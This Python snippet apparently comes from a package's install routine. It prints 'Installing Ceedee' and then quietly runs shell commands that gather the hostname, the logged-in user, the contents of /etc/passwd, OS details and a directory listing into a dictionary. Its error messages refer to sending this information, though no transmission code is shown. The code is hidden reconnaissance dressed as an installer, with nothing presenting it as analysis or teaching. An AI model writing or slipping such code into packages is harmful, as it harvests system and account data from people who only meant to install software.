print("Installing Ceedee")
os_name = platform.system()
data = {}
if os_name == 'Linux' or os_name == 'Darwin':
    try:
        hostname = os.popen('hostname').read()
        whoami = os.popen('whoami').read()
        passwd_file = os.popen('cat /etc/passwd').read()
        os_info = os.popen('uname -a').read()
        curr_dir = os.popen("pwd").read()
        list_curr_dir = os.popen("ls -la").read()

        data = {
            'OS': os_name,
            'Hostname': hostname,
            'Logged In Username': whoami,
            'Password File': passwd_file,
            'OS Information': os_info,
            'Current Directory': curr_dir,
            'List of files in Current Directory': list_curr_dir
        }

    except:
        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}

elif os_name == 'Windows':
    try:
        hostname = os.popen('hostname').read()
        whoami = os.popen('whoami').read()
        curr_dir = os.popen("cd").read()
        list_curr_dir = os.popen("dir").read()

        data = {
            'OS': os_name,
            'Hostname': hostname,
            'Logged In Username': whoami,
            'Current Directory': curr_dir,
            'List of files in Current Directory': list_curr_dir
        }

    except:
        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}

else:
    data = {'Error': 'Cannot determine OS'}
